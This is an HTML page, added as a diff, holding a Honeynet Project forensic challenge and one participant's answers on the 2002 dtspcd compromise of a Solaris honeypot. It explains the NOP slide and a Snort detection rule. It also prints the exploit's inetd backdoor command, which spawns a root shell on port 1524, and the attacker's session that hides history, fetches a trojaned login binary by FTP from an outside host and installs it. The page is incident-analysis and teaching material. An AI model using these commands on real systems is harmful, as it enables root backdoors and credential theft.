@@ -1,0 +1,1105 @@
+<!DOCTYPE doctype PUBLIC "-//w3c//dtd html 4.0 transitional//en"><html><head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="Generator" content="Microsoft Word 97">
+   <meta name="Template" content="C:\PROGRAM FILES\MICROSOFT OFFICE\OFFICE\html.dot">
+   <meta name="GENERATOR" content="Mozilla/4.7 [en] (WinNT; U) [Netscape]">
+   
+<title>Scan of the Month</title><style type="text/css"></style></head>
+
+<body text="#000000" bgcolor="#d9d6d0" link="#ff0000" vlink="#800080" alink="#ffb300">
+
+<center><font face="Book Antiqua"><font size="+4">Scan 20</font></font>
+<p><font face="Arial,Helvetica">This month's challenge is to investigate
+a compromise of a Solaris box. All submissions are due no later then 17:00
+EST, Friday, 26 April. Results will be released Friday, 03 May.</font>
+</p><p><font face="Arial,Helvetica">Skill Level: <i>Intermediate</i></font>
+</p><p><b><font face="Arial,Helvetica">Ryan C. Barnett</font></b></p></center>
+
+<p>
+</p><hr width="85%">
+<p><b><font face="Arial,Helvetica"><font size="-1">The Challenge:</font></font></b>
+<br><font face="Arial,Helvetica">On 08 January, 2002 a default, unpatched
+installation of Solaris8 Sparc was remotely compromised with the <font size="-1"><a href="http://www.cert.org/advisories/CA-2001-31.html">dtspcd
+exploit</a>. </font>What makes this attack interesting is that this is
+the first time the attack was identified and captured in the wild, resulting
+a <a href="http://www.cert.org/advisories/CA-2002-01.html">CERT advisory</a>.
+Using the Snort binary capture of the attack, answer the following questions.
+The honeypot that is attacked is 172.16.1.102.</font>
+</p><p><font face="Arial,Helvetica"><font size="-1">Download:</font></font>
+<br><font face="Arial,Helvetica"><font size="-1"><a href="http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz">http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz</a>
+MD5 = 612be364f54ca5fcb47cf70e69419175</font></font>
+</p><ol>
+<li>
+<b><font face="Arial,Helvetica">What is a NOP slide, and how is this one
+different from the NOP slide in the rpc.statd exploit in <a href="http://project.honeynet.org/scans/scan10/scan10.txt">Scan10</a>?</font></b></li>
+
+<br><font face="Arial,Helvetica"><b>Answer: </b>A NOP slide is a common
+technique in buffer-overflow attacks, where the end goal is to get the
+exploited program to execute shell code as the program owner &#8211; usually
+root. The main hurdle to overcome in successfully executing a buffer-overflow
+attack is to identify the exact address location, or offset, within the
+buffer to put the exploit code. Trying to guess this location is highly
+inefficient and the odds of quickly guessing this location are very unlikely.
+One way to greatly increase the odds of a buffer-overflow executing your
+exploit code is to pad the front of the exploit code with NOP instructions.
+NOP instructions are machine code that essentially performs "null" operations.
+By placing these NOPs in front of the exploit code, if the buffer-overflow
+pointer lands anywhere in them, they will be executed one by one and eventually
+the desired exploit code will run. The best explanation for the use of
+NOPs (and Buffer Overflows in general) is the paper<b> "</b><a href="http://www.phrack.org/phrack/49/P49-14">Smashing
+the Stack for Fun and for Profit</a>" by Aleph One -</font>
+<br> 
+<br> 
+<ol><font face="Courier New,Courier"><font size="-1">Trying to guess the
+offset even while knowing where the beginning of the stack</font></font>
+<br><font face="Courier New,Courier"><font size="-1">lives is nearly impossible. 
+We would need at best a hundred tries, and at worst</font></font>
+<br><font face="Courier New,Courier"><font size="-1">a couple of thousand. 
+The problem is we need to guess *exactly* where the</font></font>
+<br><font face="Courier New,Courier"><font size="-1">address of our code
+will start.  If we are off by one byte more or less we will</font></font>
+<br><font face="Courier New,Courier"><font size="-1">just get a segmentation
+violation or a invalid instruction.  One way to increase</font></font>
+<br><font face="Courier New,Courier"><font size="-1">our chances is to pad
+the front of our overflow buffer with NOP instructions.</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Almost all processors
+have a NOP instruction that performs a null operation.</font></font>
+<br><font face="Courier New,Courier"><font size="-1">It is usually used to
+delay execution for purposes of timing.  We will take</font></font>
+<br><font face="Courier New,Courier"><font size="-1">advantage of it and
+fill half of our overflow buffer with them.  We will place our</font></font>
+<br><font face="Courier New,Courier"><font size="-1">shellcode at the center,
+and then follow it with the return addresses. If we are</font></font>
+<br><font face="Courier New,Courier"><font size="-1">lucky and the return
+address points anywhere in the string of NOPs, they will just</font></font>
+<br><font face="Courier New,Courier"><font size="-1">get executed until they
+reach our code.  In the Intel architecture the NOP</font></font>
+<br><font face="Courier New,Courier"><font size="-1">instruction is one byte
+long and it translates to 0x90 in machine code.  Assuming</font></font>
+<br><font face="Courier New,Courier"><font size="-1">the stack starts at
+address 0xFF, that S stands forshell code, and that N stands</font></font>
+<br><font face="Courier New,Courier"><font size="-1">for a NOP instruction
+the new stack would look like this:</font></font>
+<p><font face="Courier New,Courier"><font size="-1">bottom of  DDDDDDDDEEEEEEEEEEEE 
+EEEE  FFFF  FFFF  FFFF  FFFF    
+top of</font></font>
+<br><font face="Courier New,Courier"><font size="-1">memory    
+89ABCDEF0123456789AB  CDEF  0123  4567  89AB 
+CDEF     memory</font></font>
+<br><font face="Courier New,Courier"><font size="-1">buffer               
+sfp   ret   a     b    
+c</font></font>
+<br><font face="Courier New,Courier"><font size="-1">&lt;------  
+[NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]</font></font>
+<br><font face="Courier New,Courier"><font size="-1">^                    
+|</font></font>
+<br><font face="Courier New,Courier"><font size="-1">|_____________________|</font></font>
+<br><font face="Courier New,Courier"><font size="-1">top of                                                           
+bottom of</font></font>
+<br><font face="Courier New,Courier"><font size="-1">stack                                                                
+stack</font></font></p></ol>
+
+<p><font face="Arial,Helvetica">The NOP slide in this dtspcd exploit is
+different than the one shown in the rpc_statd exploit because it used a
+different NOP slide to execute the desired shell code. Here is a side by
+side comparison of the differing Null operation code from the two exploits
+-</font>
+<br> 
+</p><center><table border="1" cellpadding="7" width="745">
+<tbody><tr>
+<td valign="top" width="38%" height="31"><font face="Arial,Helvetica"><font size="-1"> <b><u>Exploit</u></b></font></font></td>
+
+<td valign="top" width="41%" height="31">
+<center><b><u><font face="Arial,Helvetica"><font size="-1">DTSPCD</font></font></u></b></center>
+</td>
+
+<td valign="top" width="21%" height="31">
+<dir>
+<dir>
+<dir>
+<dir>
+<center><b><u><font face="Arial,Helvetica"><font size="-1">RPC_STATD</font></font></u></b></center>
+</dir>
+</dir>
+</dir>
+</dir>
+</td>
+</tr>
+
+<tr>
+<td valign="top" width="38%"><b><u><font face="Arial,Helvetica"><font size="-1">Hex
+NOP Code</font></font></u></b></td>
+
+<td valign="top" width="41%">
+<center><font face="Courier New,Courier">80 1C 40 11</font></center>
+</td>
+
+<td valign="top" width="21%">
+<center><font face="Courier New,Courier">90 90 90 90</font></center>
+</td>
+</tr>
+
+<tr>
+<td valign="top" width="38%"><b><u><font face="Arial,Helvetica"><font size="-1">ASCII
+NOP Code</font></font></u></b></td>
+
+<td valign="top" width="41%">
+<center><font face="Courier New,Courier">.</font> CTRL-\ <font face="Courier New,Courier">@
+</font>CTRL-Q</center>
+</td>
+
+<td valign="top" width="21%">
+<center><b><font face="Courier New,Courier">....</font></b></center>
+</td>
+</tr>
+</tbody></table></center>
+
+<br> 
+<br> 
+<li>
+<b><font face="Arial,Helvetica">The attack was on 08 Jan, 2002. Would Snort
+have generated an alert then for the attack?</font></b></li>
+
+<br><font face="Arial,Helvetica"><b>Answer: </b>This is a tricky question&#8230;The
+real answer is - "It depends." I will answer this question a number of
+ways.</font>
+<ol>
+<li>
+<font face="Arial,Helvetica">On Jan 08, 2002, Snort (Version 1.8.3) did
+have an alert rule that would have caught this dtspcd exploit attempt.
+Here is the alert from Snort's shellcode.rules file:</font></li>
+
+<br> 
+<ol><font face="Courier New,Courier"><font size="-1">alert ip $EXTERNAL_NET
+any - $HOME_NET any (msg:"SHELLCODE sparc NOOP"; content:"|<b>801c 4011
+801c 4011 801c 4011 801c 4011</b>|"; reference:arachnids,353; classtype:shellcode-detect;
+sid:645; rev:3;)</font></font></ol>
+
+<p><br><font face="Arial,Helvetica">Notice the rule trigger has the same
+Hex code of "<b>801c 4011 801c 4011 801c 4011 801c 4011</b>" from the exploit
+code in the table above.</font>
+<br> 
+</p><li>
+<font face="Arial,Helvetica">However, if you read the comments at the top
+of the shellcode.rules file, you will see that this rules file is not implemented
+in the default snort.conf file. This is due to the performance hit that
+snort suffers from inspecting the packet payload of every packet. Here
+is the text from the shellcode.rules file -</font></li>
+
+<br> 
+<ol><font face="Courier New,Courier"><font size="-1"># (C) Copyright 2001,
+Martin Roesch, Brian Caswell, et al. All rights reserved.</font></font>
+<p><font face="Courier New,Courier"><font size="-1"># $Id: shellcode.rules,v
+1.8.2.6 2002/04/09 17:42:09 cazz Exp $</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># ---------------</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># SHELLCODE RULES</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># ---------------</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># These signatures are
+based on shellcode that is common ammong multiple</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># publicly available
+exploits.</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1">#</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># <b>Because these signatures
+check ALL traffic for shellcode, these signatures</b></font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># <b>are disabled by
+default.</b> There is a LARGE performance hit by enabling</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># these signatures.</font></font></p></ol>
+
+<p><font face="Arial,Helvetica">So, in order to catch this exploit attempt,
+the user would have had to uncomment the shellcode entry at the bottom
+of the snort.conf file from the default setting below -</font>
+<br> 
+<br> 
+</p><ol><font face="Courier New,Courier"><font size="-1">include $RULE_PATH/netbios.rules</font></font>
+<p><font face="Courier New,Courier"><font size="-1">include $RULE_PATH/misc.rules</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1">include $RULE_PATH/attack-responses.rules</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># include $RULE_PATH/backdoor.rules</font></font>
+</p><p><b><font face="Courier New,Courier"><font size="-1"># include $RULE_PATH/shellcode.rules</font></font></b>
+</p><p><font face="Courier New,Courier"><font size="-1"># include $RULE_PATH/policy.rules</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># include $RULE_PATH/porn.rules</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># include $RULE_PATH/info.rules</font></font>
+<br><font face="Courier New,Courier"><font size="-1"></font></font> </p></ol>
+
+<li>
+<font face="Arial,Helvetica">Since the Honeynet Project does not have to
+be concerned with normal production traffic and the subsequent performance
+issues, they configured their snort.conf file to alert on all of the rules
+files (including the shellcode rules) - </font><a href="http://project.honeynet.org/papers/honeynet/snort.conf">http://project.honeynet.org/papers/honeynet/snort.conf</a><font face="Arial,Helvetica">.
+Normal Snort users maybe would have missed this attack due to a Snort configuration
+factoring in performance issues.</font></li>
+
+<br><font face="Arial,Helvetica"></font> 
+<li>
+<font face="Arial,Helvetica">Current Snort rules has updated signatures
+to detect the dtspcd attack. Additionally, there is a new snort.conf variable
+setting where you can specify shellcode ports -</font></li>
+
+<br><font face="Arial,Helvetica"></font> </ol>
+<font face="Courier New,Courier"><font size="-1"></font></font>
+<ol>
+<ol><font face="Courier New,Courier"><font size="-1"># Ports you want to
+look for SHELLCODE on. (By default, not port 80)</font></font><font face="Courier New,Courier"></font>
+<p><font face="Courier New,Courier"><font size="-1">var SHELLCODE_PORTS !80</font></font>
+<br><font face="Courier New,Courier"><font size="-1"></font></font> </p></ol>
+</ol>
+
+<li>
+<b><font face="Arial,Helvetica">In the exploit code, the command "/bin/sh
+sh -i" is given, what is its purpose, and why is 'sh' shown twice?</font></b></li>
+
+<br><font face="Arial,Helvetica"><b>Answer: </b>The shell code from the
+dtspcd exploit uses the Korn shell to create a file in the tmp directory
+called "x". This file contains one inetd.conf style entry, which uses the
+ingreslock port (1524/tcp) to spawn a root shell. The code then started
+an additional inetd daemon, which used the /tmp/x file for its configuration.
+Here is the exploit code in normal shell form -</font>
+<br> 
+<ol><font face="Courier New,Courier"><font size="-1">./bin/ksh -c echo "ingreslock
+stream tcp nowait root /bin/sh sh -i"/tmp/x;/usr/sbin/inetd -s /tmp/x;sleep
+10;/bin/rm -f /tmp/x</font></font></ol>
+
+<p><br><font face="Arial,Helvetica">To answer this question effectively,
+one needs to understand how inetd uses the inetd.conf file to spawn services.
+Here is an overview from the inetd.conf man page (bolded entries are significant)
+-</font>
+<br> 
+</p><ol><font face="Courier New,Courier"><font size="-1">The inetd.conf file
+contains the list of servers that <a href="http://www.unidata.ucar.edu/cgi-bin/man-cgi?inetd+1">inetd(1M)</a>
+invokes when it receives an Internet request over a socket. Each server
+entry is composed of a single line of the form:</font></font><font face="Courier New,Courier"></font>
+<p><i><font face="Courier New,Courier"><font size="-1">service-name endpoint-type
+protocol wait-status <b>uid server-program server-arguments</b></font></font></i><font face="Courier New,Courier"></font>
+</p><p><i><font face="Courier New,Courier"><font size="-1">Fields are separated
+by either SPACE or TAB characters. A `#' (number sign) indicates the beginning
+of a comment; characters up to the end of the line are not interpreted
+by routines that search this file.</font></font></i><font face="Courier New,Courier"></font>
+</p><p><b><i><font face="Courier New,Courier"><font size="-1">--- CUT ---</font></font></i></b><font face="Courier New,Courier"><font size="-1"></font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"><b>uid</b> The user ID
+under which the server should run. This allows servers to run with access
+privileges other than those for root.</font></font><font face="Courier New,Courier"><font size="-1"></font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"><b>server-program</b>
+Either the pathname of a server program to be invoked by inetd to perform
+the requested service, or the value internal if inetd itself provides the
+service.</font></font><font face="Courier New,Courier"><font size="-1"></font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"><b>server-arguments</b>
+If a server must be invoked with command line arguments, the entire command
+line (including argument 0) must appear in this field (which consists of
+all remaining words in the entry). If the server expects inetd to pass
+it the address of its peer (for compatibility with 4.2BSD executable daemons),
+then the first argument to the command should be specified as `%A'. No
+more than five arguments are allowed in this field.</font></font></p></ol>
+
+<p><font face="Arial,Helvetica">This essentially means, with the inetd.conf
+exploit entry in mind, that when someone connects to the ingreslock port
+(1524) a root shell will be spawned. The second "sh -I" is actually the
+inetd argument that is passed to the spawned shell. When the bourne shell
+is spawned with the "I" flag, it spawns an interactive shell. This allows
+to user to have full interactive shell (including standard input, output
+and error) access, rather than having a shell simply execute a number of
+individual commands.</font>
+<br> 
+</p><li>
+<b><font face="Arial,Helvetica">The attacker executed a variety of commands
+on the hacked Solaris box. Which commands were automated by the exploit,
+which commands were manual by the attacker himself?</font></b></li>
+
+<br><font face="Arial,Helvetica"><b>Answer: </b>Besides the automated exploit
+code sent in the original buffer-overflow packets, the attacker also executed
+additional automated shell commands when he connected to the root shell
+on the ingreslock port. In the following section, I have extracted the
+clear text shell session and combined it with the Snort time-stamps for
+better readability.</font>
+<p><font face="Arial,Helvetica"><b>Automated Commands</b> - The attacker
+executes a number of automated commands and receives the results all in
+less than one second - Notice the bolded times, which are taken from the
+Snort/Ethereal packet traces:</font>
+<br> 
+<br> 
+</p><ol><font face="Arial,Helvetica"><b>***** Automated Commands Start at 01/08-10:46:18.398427</b><font size="-1">
+*****</font></font>
+<p><font face="Courier New,Courier"><font size="-1">uname -a;ls -l /core
+/var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export
+PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print
+$2}'`</font></font>
+</p><p><b><font face="Arial,Helvetica">***** Automated Commands End at 01/08-10:46:18.902510
+*****</font></b></p></ol>
+
+<p><b><font face="Arial,Helvetica">Manual Commands - </font></b><font face="Arial,Helvetica">These
+commands were executed in the interactive shell. Notice the how the duration
+of this shell session is longer than the automated section above.</font>
+<br> 
+<br> 
+</p><ol><b><font face="Arial,Helvetica">***** Manual Commands Start at 01/08-10:46:22.262598
+*****</font></b>
+<p><font face="Courier New,Courier"><font size="-1"># w</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># unset HISTFILE</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># cd /tmp</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># mkdir /usr/lib</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># mv /bin/login /usr/lib/libfl.k</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># ftp 64.224.118.115</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1">Password:a@</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1">cd pub</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1">binary</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1">get sun1</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1">bye</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># ls</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># chmod 555 sun1</font></font>
+</p><p><font face="Courier New,Courier"><font size="-1"># mv sun1 /bin/login</font></font>
+</p><p><b><font face="Arial,Helvetica">***** Manual Commands End at 01/08-10:47:39.546140
+*****</font></b>
+<br><b><font face="Arial,Helvetica"></font></b> </p></ol>
+
+<li>
+<b><font face="Arial,Helvetica">What is sun1, and how does it work?</font></b></li>
+</ol>
+
+<dir><font face="Arial,Helvetica"><b>Answer: </b>The attacker gave away
+a big clue as to the purpose of this tool in the shell session text above.
+The two important lines are:</font>
+<dir> 
+<br><font face="Courier New,Courier"><font size="-1"># mv /bin/login /usr/lib/libfl.k</font></font>
+<p><font face="Courier New,Courier"><font size="-1"># mv sun1 /bin/login</font></font>
+<br><font face="Courier New,Courier"><font size="-1"></font></font> </p></dir>
+<font face="Arial,Helvetica">The sun1 file is obviously some form of trojaned
+login program. In order to examine the file, I extracted it from the snort
+binary file using Ethereal's "Follow TCP Stream" functionality. If you
+do not know how to use this functionality of Ethereal - read some of the
+submissions from the Honeynet Project's Scan of the Month - <a href="http://project.honeynet.org/scans/scan18/">Scan
+18</a>.  I decided to conduct my initial file analysis on my Windows2000
+forensic workstation.  This workstation has multiple <a href="http://www.vmware.com/">VMWare</a>
+Guest OS's running - Windows2000, RedHat Linux 6.2. and Solaris 8 i386. 
+Since this program's intended platform was Solaris 8 on the honeypot, I
+loaded the sun1 file onto a floppy and copied it into the Windows2000 VMware
+host.  This would prevent this program from successfully executing
+the intended Soalris code on my system.  I used the <a href="http://www.redhat.com/software/tools/cygwin/">Cygwin
+toolset</a> my W2K system.  Cygwin uses a Unix-like API to Windows,
+which allows you to work in a normal shell environment and use the normal
+unix system tools and commands.  If you are a Unix Die-Hard, then
+Cygwin is your freind when it comes to working with Windows hosts.</font>
+<p><font face="Arial,Helvetica">Following in the traditional steps of Malware
+Analysis, I ran the following tests:</font></p></dir>
+
+<ul>
+<ul>
+<li>
+<font face="Arial,Helvetica">I first ran the Unix "file" command against
+sun1 in the hopes of gaining some information (By the way, Cygwin uses
+the "$" prompt for the Admin account.  This might cause some confusion
+in my output below if you were thinking that I wasn't root):</font></li>
+</ul>
+</ul>
+
+<dir>
+<dir>
+<dir><b><font face="Courier New,Courier"><font size="-1">$ hostname</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">sapheW2K</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">$ pwd</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">/usr/users/rbarnett</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">$ ls -l sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">-rwxr-xr-x  
+1 root     bin       
+89776 Apr  4 17:38 sun1</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">$ file ./sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">sun1: ELF 32-bit MSB
+executable, SPARC, version 1 (SYSV), statically linked, stripped</font></font>
+<dir>
+<dir> </dir>
+</dir>
+</dir>
+<font face="Arial,Helvetica">This tells us some information about the file. 
+This file is statically linked, which means that it will not call up any
+library files on the host.  It was created on SPARC architecture and
+it has been stripped of any extra debugging information, which could aid
+us when we run the strings command.</font></dir>
+</dir>
+
+<ul>
+<ul>
+<li>
+<font face="Arial,Helvetica">I then ran the Cygwin "ld" command against
+sun1.  I realize that since the file was statically linked, it shouldn't
+have any dependencies, however I wanted to be thorough:</font></li>
+
+<br><font face="Arial,Helvetica"><font size="-1"></font></font> 
+<ul><b><font face="Courier New,Courier"><font size="-1">$ ld --verbose sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">GNU ld version 2.11.92
+20011001</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  Supported emulations:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">   i386pe</font></font>
+<br><font face="Courier New,Courier"><font size="-1">using internal linker
+script:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">==================================================</font></font>
+<br><font face="Courier New,Courier"><font size="-1">OUTPUT_FORMAT(pei-i386)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">SEARCH_DIR(/lib); SEARCH_DIR(/usr/lib);
+SEARCH_DIR(/usr/lib); SEARCH_DIR(/usr/lib/w32api); SEAR</font></font>
+<br><font face="Courier New,Courier"><font size="-1">); SEARCH_DIR(/usr/i686-pc-cygwin/lib);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">ENTRY(_mainCRTStartup)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">SECTIONS</font></font>
+<br><font face="Courier New,Courier"><font size="-1">{</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .text  __image_base__
++ __section_alignment__  :</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+*(.init)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.text)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(SORT(.text$*))</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.glue_7t)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.glue_7)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+___CTOR_LIST__ = .; __CTOR_LIST__ = . ;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">                       
+LONG (-1); *(.ctors); *(.ctor); LONG (0);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+___DTOR_LIST__ = .; __DTOR_LIST__ = . ;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">                       
+LONG (-1); *(.dtors); *(.dtor);  LONG (0);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+*(.fini)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    /*
+??? Why is .gcc_exc here?  */</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+*(.gcc_exc)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+etext = .;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.gcc_except_table)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  /* The Cygwin32
+library uses a section to avoid copying certain data</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+on fork.  This used to be named ".data".  The linker used</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+to include this between __data_start__ and __data_end__, but that</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+breaks building the cygwin32 dll.  Instead, we name the section</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+".data_cygwin_nocopy" and explictly include it after __data_end__. */</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .data BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    __data_start__
+= . ;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.data)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.data2)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(SORT(.data$*))</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    __data_end__
+= . ;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.data_cygwin_nocopy)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .rdata BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.rdata)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(SORT(.rdata$*))</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.eh_frame)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .pdata BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.pdata)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .bss BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    __bss_start__
+= . ;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.bss)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(COMMON)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    __bss_end__
+= . ;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .edata BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.edata)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  /DISCARD/ :</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.debug$S)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.debug$T)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.debug$F)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.drectve)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .idata BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    /*
+This cannot currently be handled with grouped sections.</font></font>
+<br><font face="Courier New,Courier"><font size="-1">       
+See pe.em:sort_sections.  */</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    SORT(*)(.idata$2)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    SORT(*)(.idata$3)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    /*
+These zeroes mark the end of the import list.  */</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    LONG
+(0); LONG (0); LONG (0); LONG (0); LONG (0);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    SORT(*)(.idata$4)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    SORT(*)(.idata$5)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    SORT(*)(.idata$6)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    SORT(*)(.idata$7)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .CRT BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(SORT(.CRT$*))</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .endjunk BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    /*
+end is deprecated, don't use it */</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+end = .;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+_end = .;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    
+__end__ = .;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .rsrc BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.rsrc)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(SORT(.rsrc$*))</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .reloc BLOCK(__section_alignment__)
+:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    *(.reloc)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .stab BLOCK(__section_alignment__)
+(NOLOAD) :</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    [
+.stab ]</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  .stabstr BLOCK(__section_alignment__)
+(NOLOAD) :</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  {</font></font>
+<br><font face="Courier New,Courier"><font size="-1">    [
+.stabstr ]</font></font>
+<br><font face="Courier New,Courier"><font size="-1">  }</font></font>
+<br><font face="Courier New,Courier"><font size="-1">}</font></font>
